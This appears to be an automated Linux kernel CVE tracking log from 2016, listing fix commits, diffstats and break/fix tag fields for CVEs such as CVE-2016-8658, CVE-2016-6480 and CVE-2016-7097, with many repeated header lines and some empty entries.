    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
